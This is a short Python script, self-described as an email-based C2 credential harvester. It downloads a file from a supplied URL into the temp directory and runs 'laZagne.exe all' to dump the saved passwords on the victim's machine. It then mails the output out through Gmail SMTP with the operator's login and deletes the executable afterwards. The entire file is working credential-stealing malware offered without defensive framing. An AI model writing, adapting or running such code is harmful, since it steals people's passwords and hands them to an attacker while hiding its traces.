#!/usr/bin/env python
"""
An email-based C2 OS-agnostic credential harvester.
"""
import requests
import subprocess
import smtplib
import os
import tempfile

class Harvester:
    def __init__(self, email, password, url):
        self.email = email
        self.password = password
        self.url = url

    def mail_stdout(self, email, password, logfile):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, logfile)
        server.quit()

    def download(self, url):
        file_name = url.split("/")[-1]
        get_response = requests.get(url)
        with open(file_name, "wb") as out_file:
            out_file.write(get_response.content)

    def start(self):
        tmp_dir = tempfile.gettempdir()
        os.chdir(tmp_dir)
        self.download(self.url)
        stdout = subprocess.check_output("laZagne.exe all", shell=True)
        self.mail_stdout(self.email, self.password, stdout)
        os.remove("laZagne.exe")